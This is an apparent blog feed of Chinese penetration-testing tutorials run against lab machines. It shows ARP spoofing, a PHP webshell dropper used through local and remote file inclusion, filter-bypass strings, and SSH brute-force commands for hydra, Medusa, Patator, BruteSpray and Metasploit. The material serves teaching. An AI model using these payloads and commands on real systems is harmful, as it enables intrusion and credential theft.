        <content type="html"><![CDATA[<h1 id="arp中间人攻击"><a href="#arp中间人攻击" class="headerlink" title="arp中间人攻击"></a>arp中间人攻击</h1><h2 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h2><p>工具：arpspoof</p><p>目标ip：192.168.3.137</p><p>网关：192.168.3.1</p><p>kali ip：192.168.19.137</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.3.137 192.168.3.1</span><br></pre></td></tr></table></figure><h2 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h2><p>工具：driftnet</p><p>第一步：开启端口转发功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><p>检查是否开启（开启返回1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><p>第二步：arp欺骗</p><p>第三歩：dirftnet</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirftnet -i eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - arp中间人攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2020/04/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/04/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞：</p><p>File Inclusion，意思是文件包含(漏洞)，是指当服务器开启<strong>allow_url_include</strong>选项时，就可通过php的某些特性函数（<strong>include()</strong>，<strong>require()</strong>和<strong>include_once()</strong>，<strong>require_once()</strong>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p><p>文件包含漏洞分为<strong>本地文件包含漏洞</strong> 和 <strong>远程文件包含漏洞</strong>。</p><p>远程文件包含漏洞：因为开启php配置中的<strong>allow_url_fopen</strong>选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><ol><li><p>文件包含（File Inclusion）即程序通过[包含函数]调用本地或远程文件，以此来实现拓展功能</p></li><li><p>被包含的文件可以是以各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞</p></li><li><p>文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等包含函数</p></li></ol><p><strong>文件包含分为两类：</strong></p><p>本地文件包含（Local File Inclusion）当被包含文件在服务器本地时，就形成本地文件包含</p><p>远程文件包含（Remote File inclusion）当被包含的文件在第三方服务器时，叫做远程文件包含</p><h2 id="低级安全渗透"><a href="#低级安全渗透" class="headerlink" title="低级安全渗透"></a>低级安全渗透</h2><h3 id="本地文件包含-webshell"><a href="#本地文件包含-webshell" class="headerlink" title="本地文件包含+webshell"></a>本地文件包含+webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 制作一句话图片木马 <span class="number">666.</span>jpg</span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell3.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php @eval($_POST[666]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2.</span> 上传图片木马文件</span><br><span class="line"><span class="number">3.</span>执行文件包含并生成后门</span><br><span class="line"><span class="number">4.</span>通过蚁剑连接webshell</span><br><span class="line">    </span><br><span class="line">提示：</span><br><span class="line">../../www/DVWA/hackable/uploads<span class="comment">//DVWA文件上传访问的目录 666.jpg</span></span><br><span class="line">../../www/DVWA/vulnerabilities/fi<span class="comment">//DVWA文件包含访问的目录 shell3.php</span></span><br></pre></td></tr></table></figure><p>图片制作：</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581152252234.png"  alt="1581152252234"></p><h3 id="远程文件包含-webshell"><a href="#远程文件包含-webshell" class="headerlink" title="远程文件包含+webshell"></a>远程文件包含+webshell</h3><p>建立远程服务器，本项目使用kali作为远程服务器</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581154911072.png"  alt="1581154911072"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service apache2 start</span><br><span class="line">root@kali:~# vim var&#x2F;www&#x2F;html&#x2F;shell.text</span><br><span class="line">    &lt;?php fputs(fopen(&quot;shell4.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[666]);?&gt;&#39;)?&gt;</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581155381341.png"  alt="1581155381341"></p><p>把远程服务器的路径复制到网页执行</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157223416.png"  alt="1581157223416"></p><p>打开蚁剑添加数据</p><p><strong>注意：路径是文件包含的路径+执行一句话木马生成的文件名</strong></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157508777.png"  alt="1581157508777"></p><h2 id="中级安全渗透"><a href="#中级安全渗透" class="headerlink" title="中级安全渗透"></a>中级安全渗透</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157757837.png"  alt="1581157757837"></p><p>由于代码对http://、https://和../ 、..\进行了替换成空“”，对于本地文件包漏洞含依旧可以执行，而远程文件包含漏洞进行了限制。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581158408627.png"  alt="1581158408627"></p><p>对于远程文件包含可以通过双重复写进行处理</p><p>http://        可写成     ht<a href="http://tp://" target="_blank" rel="noopener">http://tp://</a></p><p>https://        可写成     ht<a href="https://tps://" target="_blank" rel="noopener">https://tps://</a></p><p>../        可写成         …/./</p><p>..\        可写成        …\.\</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/2020/04/26/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%20Burp%20suite%E5%92%8CAWVS/"/>
      <url>/2020/04/26/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%20Burp%20suite%E5%92%8CAWVS/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="Web漏洞扫描-Burp-suite"><a href="#Web漏洞扫描-Burp-suite" class="headerlink" title="Web漏洞扫描 Burp suite"></a>Web漏洞扫描 Burp suite</h2><p>安全渗透使用最广泛的漏洞扫描工具之一，能实现从漏洞发现到利用的完整工程。功能强大、配置较为复杂、可定制型强，支持丰富的第三方拓展插件。基于Java编写，跨平台支持，分为Free和Professional版本</p><p><a href="http://protswigger.net/burp/" target="_blank" rel="noopener">http://protswigger.net/burp/</a></p><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581664404190.png"  alt="1581664404190"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Target目标模块用于设置扫描域（target scope）、生成站点地图（sitemap）生成安全分析</span><br><span class="line">Proxy代理模块用于拦截游览器的http会话内容</span><br><span class="line">Spider扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">Intruder入侵（渗透）模块根据上面检测到的可能存在漏洞链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">入侵模块的原理是根据访问链接中存在的参数&#x2F;变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">Repeater重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">Sequencer序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">Decoder解码器模块用于实现对URL、HTML、Base64、ASCII、二&#x2F;八&#x2F;十六进制、哈希等编码转换</span><br><span class="line">Comparer对比模块用于对两次不同的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">Extender拓展模块是burpsuite非常强悍的一个功能，也是它跟其他web安全评估系统最大的差别</span><br><span class="line">通过拓展模块，可以加载自己开发的、或者第三方模块、打造自己的burpsuite功能</span><br><span class="line">通过burpsuite提供的API接口，目前可以支持Java&#x2F;Python&#x2F;Ruby三种语言的模块编写</span><br><span class="line">Option分为project&#x2F;User Options，主要对软件进行全局设置</span><br><span class="line">Alerts显示软件的使用日志信息</span><br></pre></td></tr></table></figure><h3 id="项目试验环境"><a href="#项目试验环境" class="headerlink" title="项目试验环境"></a>项目试验环境</h3><p>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</p><p>测试渗透机：win7/kali</p><h3 id="Burp-Suite安装"><a href="#Burp-Suite安装" class="headerlink" title="Burp Suite安装"></a>Burp Suite安装</h3><p>Kali Linux：集成Burp Suite Free版本，不支持scanner功能</p><p>Windows： Burp Suite Pro 1.7.30版本，支持全部功能</p><p>启动方法：</p><p><code>java -jar -Xmx1024M /burpsuite_path/BurpHelper.jar</code></p><p>Burp Suite带有非常详细的帮助文档</p><h3 id="Burp-Suite使用"><a href="#Burp-Suite使用" class="headerlink" title="Burp Suite使用"></a>Burp Suite使用</h3><h4 id="代理功能Proxy"><a href="#代理功能Proxy" class="headerlink" title="代理功能Proxy"></a>代理功能Proxy</h4><p>开启监听端口</p><p>游览器设置代理</p><p>代理功能详解</p><p>拦截账号信息</p><h4 id="目标功能Target"><a href="#目标功能Target" class="headerlink" title="目标功能Target"></a>目标功能Target</h4><p>设置目标域</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581667068222.png"  alt="1581667068222"></p><h4 id="爬虫功能Spider"><a href="#爬虫功能Spider" class="headerlink" title="爬虫功能Spider"></a>爬虫功能Spider</h4><p>准备工作</p><p>设置代理获取域名</p><p>访问目标网站</p><p>设置目标域</p><p>拦截功能关闭</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669152597.png"  alt="1581669152597"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669113987.png"  alt="1581669113987"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669186181.png"  alt="1581669186181"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669244058.png"  alt="1581669244058"></p><h4 id="扫描功能Scanner"><a href="#扫描功能Scanner" class="headerlink" title="扫描功能Scanner"></a>扫描功能Scanner</h4><p>准备工作</p><p>设置代理获取域名</p><p>访问目标网站</p><p>设置目标域</p><p>拦截功能关闭</p><p>扫描方式：</p><p>主动扫描精准度高时间长影响大消耗资源大</p><p>被动扫描精准度低时间段影响小消耗资源小</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670070610.png"  alt="1581670070610"></p><p>攻击插入点</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670129251.png"  alt="1581670129251"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670150890.png"  alt="1581670150890"></p><p>主动扫描</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670196277.png"  alt="1581670196277"></p><h2 id="Web漏洞扫描-AWVS"><a href="#Web漏洞扫描-AWVS" class="headerlink" title="Web漏洞扫描-AWVS"></a>Web漏洞扫描-AWVS</h2><p>Acunetix Web Vulenrability Scanner（简称AWVS）是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p><p>它包含有收费和免费两个版本，AWVS官方网站是：<a href="http://www.acunetix.com/，官方下载地址：http://www.acunetix.com/vulnerability-scanner/download/，官方免费下试用14天。" target="_blank" rel="noopener">http://www.acunetix.com/，官方下载地址：http://www.acunetix.com/vulnerability-scanner/download/，官方免费下试用14天。</a></p><h3 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h3><ol><li>自动的客户端脚本分析器，允许对 Ajax 和 Web2.0 应用程序进行安全测试</li><li>业内最先进且深入的 SQL 注入和跨脚本测试</li><li>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer</li><li>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</li><li>支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor （双因素）验证机制</li><li>丰富的报告功能，包含 VISA PCI 依从性报告</li><li>高速的多线程扫描器轻松检索成千上万个页面</li><li>智能爬行程序检测 web 服务器类型和应用程序语言</li><li>Acunetix 检索并分析网站，包括 flash 内容、SOAP 和 AJAX</li><li>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查</li><li>可导出网站漏洞文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH密码暴力破解</title>
      <link href="/2020/04/26/SSH%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2020/04/26/SSH%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH密码暴力破解"><a href="#SSH密码暴力破解" class="headerlink" title="SSH密码暴力破解"></a>SSH密码暴力破解</h1><h2 id="hydra【海德拉】"><a href="#hydra【海德拉】" class="headerlink" title="hydra【海德拉】"></a>hydra【海德拉】</h2><p>hydra 是世界顶级密码暴力破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。</p><h3 id="指定用户破解"><a href="#指定用户破解" class="headerlink" title="指定用户破解"></a>指定用户破解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">hydra -l user -P passlist.txt ftp:<span class="comment">//192.168.0.1</span></span><br><span class="line">hydra -L userlist -p defaultpw imap:<span class="comment">//192.168.0.1/PLAIN</span></span><br><span class="line">hydra -C defaults.txt <span class="number">-6</span> pop3s:<span class="comment">//[2001:db8::1]:143/TLS:DIGEST-MDS</span></span><br><span class="line">hydra -l admin -p password ftp:<span class="comment">//[192.168.0.0/24]/</span></span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">    </span><br><span class="line">root@kali:~<span class="comment"># hydra -l root -P pass.dic 192.168.106.134 ssh</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L userlist.txt -P passlist.txt -M hosts.txt ssh -o ssh-hydra.ok</span></span><br><span class="line">    </span><br><span class="line">-l用户<span class="keyword">or</span>用户字典</span><br><span class="line">-p密码<span class="keyword">or</span>密码字典</span><br><span class="line">-M主机列表</span><br><span class="line">-o把破解的账号密码输出到文件了</span><br></pre></td></tr></table></figure><h2 id="Medusa【美杜莎】"><a href="#Medusa【美杜莎】" class="headerlink" title="Medusa【美杜莎】"></a>Medusa【美杜莎】</h2><p>Medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登陆。可以同时对多个主机，用户或密码执行强力测试。Medusa 和 hydra 一样，同样属于在线密码破解工具。不同的是，Medusa 的稳定性相比较 hydra 要好很多，但其他支持模块要比 hydra 少一些。 </p><h3 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Medusa [-h host | -H file] [-u username | -U file] [-p password | -P file] [-C file] -M module [OPT]</span><br><span class="line">    </span><br><span class="line">-h [TEXT]主机名称或者IP地址</span><br><span class="line">-H [FILE]包含目标主机名称或者IP地址文件</span><br><span class="line">-u [TEXT]测试的用户名</span><br><span class="line">-U [FILE]包含测试的用户名文件</span><br><span class="line">-p [TEXT]测试的密码</span><br><span class="line">-P [FILE]包含测试的密码文件</span><br><span class="line">-C [FILE]组合条目文件</span><br><span class="line">-O [FILE]日志信息文件</span><br><span class="line">-e [n/s/ns]n代表空密码，s代表为密码与用户名相同</span><br><span class="line">-M [TEXT]模块执行名称</span><br><span class="line">-m [TEXT]传递参数到模块</span><br><span class="line">-d显示所有的模块名称</span><br><span class="line">-n [NUM]使用非默认Tcp端口</span><br><span class="line">-s 启用SSL</span><br><span class="line">-r [NUM]重试间隔时间，默认为<span class="number">3</span>秒</span><br><span class="line">-t [NUM]设定线程数量</span><br><span class="line">-T 同时测试的主机总数</span><br><span class="line">-L并行化，每个用户使用一个线程</span><br><span class="line">-f在任何主机上找到第一个账号/密码后，停止破解</span><br><span class="line">-F在任何主机上找到第一个有效的用户名/密码后停止审计</span><br><span class="line">-q显示模块的使用信息</span><br><span class="line">-v [NUM]详细级别（<span class="number">0</span><span class="number">-6</span>）</span><br><span class="line">-w [NUM]错误条数级别（<span class="number">0</span><span class="number">-10</span>）</span><br><span class="line">-V显示版本</span><br><span class="line">-Z [TEXT]继续扫描上一次</span><br></pre></td></tr></table></figure><h3 id="破解SSH密码"><a href="#破解SSH密码" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># Medusa -M ssh -h 192.168.106.134 -u root -P passlist.txt</span></span><br></pre></td></tr></table></figure><h2 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h2><p>Patator，强大的命令行玻璃破解器</p><h3 id="可用模块"><a href="#可用模块" class="headerlink" title="可用模块"></a>可用模块</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581750910378.png"  alt="1581750910378"></p><h3 id="破解SSH密码-1"><a href="#破解SSH密码-1" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># patator ssh_login --help</span></span><br><span class="line">Patator v0<span class="number">.7</span> (https:<span class="comment">//github.com/lanjelot/patator)</span></span><br><span class="line">Usage: patator module --help</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  ssh_login host=<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> user=root password=FILE0 <span class="number">0</span>=passwords.txt -x ignore:mesg=<span class="string">'Authentication failed.'</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># patator ssh_login host=192.1168.106.134 user=root password=FILE0 0=passlist.txt</span></span><br><span class="line">root@kali:~<span class="comment"># patator ssh_login host=192.1168.106.134 user=root password=FILE0 0=passlist.txt \ -x ignore:mesg='Authentication failed.'  #忽略错误的</span></span><br></pre></td></tr></table></figure><h2 id="BruteSpray"><a href="#BruteSpray" class="headerlink" title="BruteSpray"></a>BruteSpray</h2><p>BruteSpray 是一款基于nmap扫描输出的gnamp/XML文件。自动调用Medusa对服务进行暴力破解（Medusa美杜莎 是一款端口爆破工具，速度比较Hydra九头蛇 快）。</p><h3 id="kali端安装"><a href="#kali端安装" class="headerlink" title="kali端安装"></a>kali端安装</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get updata</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install brutespray</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581752093932.png"  alt="1581752093932"></p><h3 id="语法参数-1"><a href="#语法参数-1" class="headerlink" title="语法参数"></a>语法参数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-f FILE，--file FILE参数后跟一个文件名，解析nmap输出的GNMAP或者XML文件</span><br><span class="line">-o OUTPUT，--output OUTPUT包含成功尝试目录</span><br><span class="line">-s SERVICE，--service SERVICE参数后跟一个服务名，指定要攻击的服务</span><br><span class="line">-t THREADS，--threads THREADS参数后跟一个数值，指定Medusa线程数</span><br><span class="line">-T HOSTS，--hosts HOSTS参数后跟一数值，指定同时测试的主机数</span><br><span class="line">-U USERLIST，--userlist USerLIST参数后跟用户字典文件</span><br><span class="line">-P PASSLIST，--passlist PASSLIST 参数后跟密码字典文件</span><br><span class="line">-u USERNAME，username USERNAME参数后跟用户名，指定一个用户名进行爆破</span><br><span class="line">-p PASSWORD，password PASSWORD参数后跟密码，指定一个密码进行爆破</span><br><span class="line">-c，--continuous成功之后继续爆破</span><br><span class="line">-i，--interactive交互模式</span><br></pre></td></tr></table></figure><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v 192.168.106.0/24 -oX nmap.xml#-oX输出文集是xml格式</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -A -p22 -v 192.168.106.0/24 -oX 22.xml#-p22，扫描22端口。-A版本扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -sP 192.168.106.0/24 -oX nmaplive.xml#sP是进行ping扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -sV -O 192.168.106.0/24 -oX nmap.xml#-O系统扫描。-sV探测端口服务版本</span></span><br></pre></td></tr></table></figure><h3 id="字典爆破-SSH"><a href="#字典爆破-SSH" class="headerlink" title="字典爆破 SSH"></a>字典爆破 SSH</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">#  brutespray --file 22.xml -U userlist.txt -P passlist.txt --threads 5 --hosts 5</span></span><br></pre></td></tr></table></figure><p>查看文件是否爆破成功</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581754693055.png"  alt="1581754693055"></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>Metasploit Framework（简称MSF）是一个编写、测试和使用exploit代码的完善环境。这个环境Wie渗透测试，Shellcode编写和漏洞研究提供一个可靠的平台，这个框架只要是由面向对象的Perl编写语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。</p><h3 id="SSH模块"><a href="#SSH模块" class="headerlink" title="SSH模块"></a>SSH模块</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali~<span class="comment"># msfconsole</span></span><br><span class="line">msf &gt; search ssh</span><br></pre></td></tr></table></figure><h3 id="SSH用户枚举"><a href="#SSH用户枚举" class="headerlink" title="SSH用户枚举"></a>SSH用户枚举</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>#<span class="title">ssh_enumusers</span>枚举用户的模块</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134#主机</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">set</span> <span class="title">USER_FILE</span> /<span class="title">root</span>/<span class="title">userlist</span>.<span class="title">txt</span>#用户</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h3 id="SSH版本探测"><a href="#SSH版本探测" class="headerlink" title="SSH版本探测"></a>SSH版本探测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>#<span class="title">ssh_version</span>版本探测模块</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h3 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">USER_FILE</span> /<span class="title">root</span>/<span class="title">userlist</span>.<span class="title">txt</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">set</span> <span class="title">PASS_FILE</span> /<span class="title">root</span>/<span class="title">passlist</span>.<span class="title">txt</span></span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_login</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 